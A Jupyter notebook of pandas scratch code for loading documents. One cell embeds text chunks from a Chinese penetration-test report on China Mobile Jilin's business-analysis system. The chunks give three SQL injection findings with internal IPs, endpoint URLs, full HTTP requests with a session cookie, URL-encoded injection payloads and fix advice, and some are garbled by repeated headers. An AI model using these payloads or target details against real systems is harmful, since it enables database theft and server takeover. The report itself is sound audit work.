{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "initial_id",
   "metadata": {
    "collapsed": true,
    "is_executing": true
   },
   "outputs": [],
   "source": [
    "ls= {'文件名': {'0': '3-1 备份恢复：中国移动通信集团吉林有限公司数据安全事件应急响应预案.docx', '1': '4-1 漏扫：系统渗透测试漏洞报告(经营分析系统).docx'}, '材料型': {'0': '用户上传', '1': '用户上传'}}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "outputs": [],
   "source": [
    "import pandas as pd\n",
    "data = pd.DataFrame([], columns=[\"文件名\", \"材料类型\"])"
   ],
   "metadata": {
    "collapsed": false,
    "ExecuteTime": {
     "end_time": "2025-09-02T09:55:36.940185600Z",
     "start_time": "2025-09-02T09:55:36.233897100Z"
    }
   },
   "id": "1203d5b9443e33a8"
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "outputs": [
    {
     "data": {
      "text/plain": "[]"
     },
     "execution_count": 5,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "data[\"文件名\"].values.tolist()"
   ],
   "metadata": {
    "collapsed": false,
    "ExecuteTime": {
     "end_time": "2025-09-02T09:55:54.985453300Z",
     "start_time": "2025-09-02T09:55:54.975663400Z"
    }
   },
   "id": "4db1da52e9ee109c"
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "outputs": [],
   "source": [
    "ls=[['2025年4月25日中国移动经营分析系统渗透测试漏洞报告\\n\\n检查综述\\n\\n为积极落实中央网信办关于加强信息安全工的部署，认真贯彻两部委安全考核的要求，按照中国移动IT条线全网安全合规检查要求，2025年4月25日，对吉林移动安全情况进行了检查。\\n\\n本次工作共检查经营分析系统页面以及下下子网页1个。\\n\\n应用安全检查及结果分析\\n\\n对业务系统进行安全测试，发现的应用漏洞风险统计如下：\\n\\n渗透安全检查\\n\\n应用安全评估\\n\\n高危风险数量\\n\\n3\\n\\n\\n\\n中危风险数量\\n\\n0\\n\\n\\n\\n低危风险数量\\n\\n0', '应用安全评估\\n\\n高危风险数量\\n\\n3\\n\\n\\n\\n中危风险数量\\n\\n0\\n\\n\\n\\n低危风险数量\\n\\n0\\n\\n\\n\\n风险问题总计\\n\\n3\\n\\n发现的应用漏洞 风险类型汇总如下：\\n\\n序号\\n\\n风险级别\\n\\n应用漏洞描述\\n\\n1\\n\\n高危\\n\\nSQL注入漏洞\\n\\n2\\n\\n高危\\n\\nSQL注入漏洞\\n\\n3\\n\\n高危\\n\\nSQL注入漏洞\\n\\n应用安全漏洞详情  \\n\\n 吉林移动-经营分析系统-SQL注入漏洞\\n\\n问题描述：发现吉林移动-经营分析系统存在SQL注入漏洞。\\n\\n测试url：', '问题描述：发现吉林移动-经营分析系统存在SQL注入漏洞。\\n\\n测 试url：\\n\\nhttp://10.255.133.186:8888/portal/pages/frame/portal/home/homeAction.jsp?eaction=cityList\\n\\n测试过程：\\n\\n测试发现吉林经营分析系统存在SQL注入漏洞，可在4A登录后进行测试\\n\\n截图及说明：\\n\\n截图1：打开http://10.161.124.80/iam/v1/#/home/homeManage，进入经营分析系统：', '截图2：访问http://10.255.133.186:8888/portal/pages/portal/home/home.jsp ,接口自动发送post请求\\n\\n\\n\\n\\n\\n截图3：接口http://10.255.133.186:8888/portal/pages/frame/portal/home/homeAction.jsp?eaction=cityList   存在SQL 注入漏洞\\n\\n\\n\\n截图4：SQLMAP验证,同类型漏洞后续不再使用SQLMAP验证\\n\\n\\n\\n\\n\\n相关数据包如下：', '截图4：SQLMAP验证,同类型漏洞后续不再使用SQLMAP验证\\n\\n\\n\\n\\n\\n相关 数据包如下：\\n\\nSQL注入漏洞\\n\\nPOST /portal/pages/frame/portal/home/homeAction.jsp?eaction=cityList HTTP/1.1\\n\\nHost: 10.255.133.186:8888\\n\\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0', 'Content-Length: 94\\n\\nAccept: */*\\n\\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\\n\\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\\n\\nCookie: JSESSIONID=77AFA9613C66F34F328BC82100E4D7F5.portal', 'Origin: http://10.255.133.86:8888\\n\\nReferer: http://10.255.133.186:8888/portal//pages/portal/home/home.jsp\\n\\nSec-Gpc: 1\\n\\nX-Requested-With: XMLHttpRequest\\n\\nAccept-Encoding: gzip', 'Accept-Encoding: gzip\\n\\n\\n\\nareaId=0000%2F%2A%2A%2Fand%2F%2A%2A%2Fcast%28md5%28%271474358703%27%29as%2F%2A%2A%2Fint%29%3E0\\n\\n\\n\\n风险程度：[高危]\\n\\n风险分析：攻击者可 以利用该漏洞对获取数据库的敏感信息,甚至通过os-shell拿到服务器权限。\\n\\n整改建议：\\n\\n使用预编译语句。\\n\\n检查数据类型\\n\\n使用安全函数\\n\\n\\n\\n吉林移动-经营分析系统-SQL注入漏洞', '使用预编译语句。\\n\\n检查数据类型\\n\\n使用安全函数\\n\\n\\n\\n吉林移动-经营分析系统-SQL注入漏洞\\n\\n问题描述：发现吉林移动-经营分析系统存在SQL注入漏洞。\\n\\n测 试url：\\n\\nhttp://10.255.133.186:8888/portal/pages/frame/portal/home/homeAction.jsp?eaction=getKpiDataInfo\\n\\n测试过程：\\n\\n测试发现吉林经营分析系统存在SQL注入漏洞，在4A登录后进行测试\\n\\n截图及说明：', '测试过程：\\n\\n测试发现吉林经营分析系统存在SQL注入漏洞，可在4A登录后进行测试\\n\\n截图及说明：\\n\\n截图1：打开http://10.255.133.1 186:8888/portal/pages/portal/home/home.jsp,接口自动发送post请求\\n\\n\\n\\n\\n\\n截图2：SQL注入漏洞\\n\\n\\n\\n\\n\\n相关数据包如下：\\n\\nSQL注入漏洞', '截图2：SQL注入漏洞\\n\\n\\n\\n\\n\\n相关数据包如下：\\n\\nSQL注入漏洞\\n\\nPOST /portal/pages/frame/portal/home/homeAction.jsp?eaction=getKpiDataInfo HTTP/1.1\\n\\nHost: 10.255.133.186:8888\\n\\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0', 'Content-Length: 132\\n\\nAccept: */*\\n\\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\\n\\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\\n\\nCookie: JSESSIONID=77AFA9613C66F34F328BC82100E4D7F5.portal', 'Origin: http://10.255.133.186:8888\\n\\nReferer: http://10.255.133.186:8888/portal//pages/portal/home/home.jsp\\n\\nSec-Gpc: 1\\n\\nX-Requested-With: XMLHttpRequest\\n\\nAccept-Encoding: gzip', 'Accept-Encoding: gzip\\n\\n\\n\\nareaId=9999%27and%28select%271%27from%2F%2A%2A%2Fcast%28md5%281994831893%29as%2F%2A%2A%2Fint%29%29%3E%270&cityId=9999&dayId=20250424\\n\\n\\n\\n风险程度：[高危]\\n\\n风险分析：攻击者可以利用该漏洞对获取数据库的敏感信息,甚至通过os-shell拿到服务器权限。\\n\\n整改建议：\\n\\n1.使用预编译语句。\\n\\n2.检查据类型', '整改建议：\\n\\n1.使用预编译语句。\\n\\n2.检查数据类型\\n\\n3.使用安全函数\\n\\n\\n\\n吉林移动-经营分析系统-SQL注入漏洞\\n\\n问题描述：发现吉林移动-经营分析系统存在S SQL注入漏洞。\\n\\n测试url：\\n\\nhttp://10.255.133.186:8888/portal/pages/frame/portal/home/homeAction.jsp?eaction=getKpiDataInfo\\n\\n测试过程：\\n\\n测试发现吉林经营分析系 统存在SQL注入漏洞，可在4A登录后进行测试\\n\\n截图及说明：', '测试过程：\\n\\n测试发现吉林经营分析系统存在SQL注入漏洞，可在4A登录后进行测试\\n\\n截图及说明：\\n\\n截图1：打开in: http://10.255.133.186:8888\\n\\nReferer: http://10.255.133.186:8888/portal//pages/portal/home/home.jsp\\n\\nSec-Gpc: 1\\n\\nX-Requested-With: XMLHttpRequest\\n\\nAccept-in: http://10.255.133.186:8888\\n\\nReferer: http://10.255.133.186:8888/portal//pages/portal/home/home.jsp\\n\\nSec-Gpc: 1\\n\\nX-Requested-With: XMLHttpRequest\\n\\nAccept-in: http://10.255.133.186:8888\\n\\nReferer: http://10.255.133.186:8888/portal//pages/portal/home/home.jsp\\n\\nSec-Gpc: 1\\n\\nX-Requested-With: XMLHttpRequest\\n\\nAccept-in: http://10.255.133.186:8888\\n\\nReferer: http://10.255.133.186:8888/portal//pages/portal/home/home.jsp\\n\\nSec-Gpc: 1\\n\\nX-Requested-With: XMLHttpRequest\\n\\nAccept-Encoding: gzip', 'Accept-Encoding: gzip\\n\\n\\n\\nareaId=9999&cityId=9999%27and%28select%271%27from%2F%2A%2A%2Fcast%28md5%281025465904%29as%2F%2A%2A%2Fint%29%29%3E%270&dayId=20250424\\n\\n\\n\\n风险程度：[高危]\\n\\n风险分析：攻击者可以利用该漏洞对获取数据库的敏感信息,甚至通过os-shell拿到服务器权限。\\n\\n整改建议：\\n\\n1.使用预编译语句。\\n']]"
   ],
   "metadata": {
    "collapsed": false,
    "ExecuteTime": {
     "end_time": "2025-09-03T03:02:43.982926800Z",
     "start_time": "2025-09-03T03:02:43.944388100Z"
    }
   },
   "id": "293a53b8ec1f5859"
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "outputs": [
    {
     "data": {
      "text/plain": "17"
     },
     "execution_count": 8,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "len(ls[0])"
   ],
   "metadata": {
    "collapsed": false,
    "ExecuteTime": {
     "end_time": "2025-09-03T03:02:53.348043900Z",
     "start_time": "2025-09-03T03:02:53.343046Z"
    }
   },
   "id": "700c2c35c0038d90"
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "outputs": [],
   "source": [
    "ll=[]\n",
    "__=[[ll.append(d) for d in doc] for doc in ls]"
   ],
   "metadata": {
    "collapsed": false,
    "ExecuteTime": {
     "end_time": "2025-09-03T03:04:00.940982100Z",
     "start_time": "2025-09-03T03:04:00.925021200Z"
    }
   },
   "id": "908bd59871bda182"
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "outputs": [],
   "source": [
    "table_df = {'文件名': {'0': '4-1 漏扫：系统渗透测试漏洞报告(经营分析系统).docx'}, '材料类型': {'0': '用户上传'}}\n",
    "ZIP_DICT={\"ZipFileLoader\": [\".zip\", \".tar.gz\", \".7z\"]}"
   ],
   "metadata": {
    "collapsed": false,
    "ExecuteTime": {
     "end_time": "2025-09-04T02:10:38.078405900Z",
     "start_time": "2025-09-04T02:10:38.052783Z"
    }
   },
   "id": "e141ead81b5e605e"
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "4-1 漏扫：系统渗透测试漏洞报告(经营分析系统).docx\n"
     ]
    }
   ],
   "source": [
    "ls=[1,2,3]\n",
    "for unit in table_df[\"文件名\"].values():\n",
    "    if unit not in ls:\n",
    "        print(unit)"
   ],
   "metadata": {
    "collapsed": false,
    "ExecuteTime": {
     "end_time": "2025-09-03T03:14:40.762082500Z",
     "start_time": "2025-09-03T03:14:40.749893900Z"
    }
   },
   "id": "1a31fa8fbe02ff3b"
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "outputs": [],
   "source": [
    "ss=pd.DataFrame([], columns=[\"文件名\", \"材料类型\"])"
   ],
   "metadata": {
    "collapsed": false,
    "ExecuteTime": {
     "end_time": "2025-09-03T03:15:37.954841700Z",
     "start_time": "2025-09-03T03:15:37.913544900Z"
    }
   },
   "id": "f0c00363f8219a01"
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "outputs": [
    {
     "data": {
      "text/plain": "[]"
     },
     "execution_count": 20,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "ss[\"文件名\"].values.tolist()"
   ],
   "metadata": {
    "collapsed": false,
    "ExecuteTime": {
     "end_time": "2025-09-03T03:15:54.868402300Z",
     "start_time": "2025-09-03T03:15:54.852946300Z"
    }
   },
   "id": "a1cd8522403a620"
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "outputs": [
    {
     "data": {
      "text/plain": "[['.zip', '.tar.gz', '.7z'],\n {'0': '4-1 漏扫：系统渗透测试漏洞报告(经营分析系统).docx'},\n {'0': '用户上传'}]"
     },
     "execution_count": 23,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "list(ZIP_DICT.values())+list(table_df.values())"
   ],
   "metadata": {
    "collapsed": false,
    "ExecuteTime": {
     "end_time": "2025-09-04T02:11:10.974523200Z",
     "start_time": "2025-09-04T02:11:10.958673800Z"
    }
   },
   "id": "2d8e2e1f179d29f1"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "outputs": [],
   "source": [],
   "metadata": {
    "collapsed": false
   },
   "id": "76d2f2c06f5a8cb8"
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 2
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython2",
   "version": "2.7.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
